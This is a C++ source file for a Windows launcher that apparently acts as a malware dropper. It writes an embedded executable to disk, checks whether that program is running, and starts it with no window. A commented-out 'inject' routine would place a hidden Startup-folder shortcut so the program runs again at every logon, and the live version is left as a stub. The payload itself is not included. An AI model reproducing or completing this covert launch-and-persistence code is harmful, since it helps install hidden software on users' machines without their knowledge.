#include <windows.h>
#include <fstream>
#include <cstdlib>
#include <tuple>
#include <iostream>
#include <tlhelp32.h>
#include <shlobj.h>
#include <Objbase.h>

#include "resourceloader.h"
#include "launcher.h"

using namespace std;

static wchar_t* stringToWString(string str) {
	int length = MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, NULL, 0);
	wchar_t* w_string = new wchar_t[length];
	MultiByteToWideChar(CP_UTF8, 0, str.c_str(), -1, w_string, length);
	return w_string;
}

bool Launcher::checkPrivileges() {
	BOOL fRet = FALSE;
	HANDLE hToken = NULL;

	if (OpenProcessToken(GetCurrentProcess(), TOKEN_QUERY, &hToken)) {
		TOKEN_ELEVATION Elevation;
		DWORD cbSize = sizeof(TOKEN_ELEVATION);

		if (GetTokenInformation(hToken, TokenElevation, &Elevation, sizeof(Elevation), &cbSize)) {
			fRet = Elevation.TokenIsElevated;
		}
	}

	if (hToken) {
		CloseHandle(hToken);
	}

	return fRet;
}

bool Launcher::checkExtracted() {
	ifstream file(EXTRACT_LOCATION);
	return file.good();
}

void Launcher::extract() {
	cout << "extracting" << endl;

	ofstream file(EXTRACT_LOCATION, ios::binary);

	tuple<char*, size_t> exe = resource::loadExe();
	file.write(get<0>(exe), get<1>(exe));

	file.close();

	cout << "extracted" << endl;
}

bool Launcher::checkRunning() {
	bool result = false;

	wchar_t* exe_name = stringToWString(NAME + ".exe");

	HANDLE hSnapshot = CreateToolhelp32Snapshot(TH32CS_SNAPPROCESS, 0);
	if (hSnapshot != INVALID_HANDLE_VALUE) {
		PROCESSENTRY32 pe32;
		pe32.dwSize = sizeof(PROCESSENTRY32);
		if (Process32First(hSnapshot, &pe32)) {
			do {
				wstring proccess_name = pe32.szExeFile;
				if (exe_name == proccess_name) {
					result = true;
					break;
				}
			} while (Process32Next(hSnapshot, &pe32));
		}
		CloseHandle(hSnapshot);
	}

	return result;
}

void Launcher::launch() {
	cout << "launching" << endl;

	wchar_t* exe_path = stringToWString(EXTRACT_LOCATION);

	STARTUPINFO si;
	PROCESS_INFORMATION pi;

	ZeroMemory(&si, sizeof(si));
	si.cb = sizeof(si);
	ZeroMemory(&pi, sizeof(pi));

	CreateProcess(NULL,
		exe_path,
		NULL,
		NULL,
		FALSE,
		CREATE_NO_WINDOW,
		NULL,
		NULL,
		&si,
		&pi
	);

	CloseHandle(pi.hProcess);
	CloseHandle(pi.hThread);

	cout << "launched" << endl;
}

//bool Launcher::checkInjected() {
//	TCHAR startup_path[MAX_PATH];
//	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
//		wstring shortcut_path = startup_path;
//		shortcut_path += stringToWString("//" + NAME + ".lnk");
//		
//		ifstream file(shortcut_path);
//		return file.good();
//	}
//
//	return false;
//}
//
//void Launcher::inject() {
//	cout << "injecting" << endl;
//
//	TCHAR startup_path[MAX_PATH];
//	if (SUCCEEDED(SHGetFolderPath(NULL, CSIDL_STARTUP, NULL, 0, startup_path))) {
//		wstring shortcut_path = startup_path;
//		shortcut_path += stringToWString("//" + NAME + ".lnk");
//
//		wchar_t* exe_path = stringToWString(EXTRACT_LOCATION);
//
//		CoInitialize(NULL);
//		IShellLink* pShellLink = NULL;
//		CoCreateInstance(CLSID_ShellLink, NULL, CLSCTX_INPROC_SERVER, IID_IShellLink, (LPVOID*)&pShellLink);
//		pShellLink->SetPath(exe_path);
//		pShellLink->SetShowCmd(SW_HIDE);
//		IPersistFile* pPersistFile = NULL;
//		pShellLink->QueryInterface(IID_IPersistFile, (LPVOID*)&pPersistFile);
//		pPersistFile->Save(shortcut_path.c_str(), TRUE);
//		pPersistFile->Release();
//		pShellLink->Release();
//		CoUninitialize();
//	}
//
//	cout << "injected" << endl;
//}

bool Launcher::checkInjected() {
	return true; // implement
}

void Launcher::inject() {
	cout << "injecting" << endl;

	// implement	

	cout << "injected" << endl;
}

void Launcher::main() {
	if (!checkExtracted()) extract();
	if (!checkRunning()) {
		launch();
		if (!checkInjected()) inject();
	}
	else {
		cout << "already running" << endl;
	}
}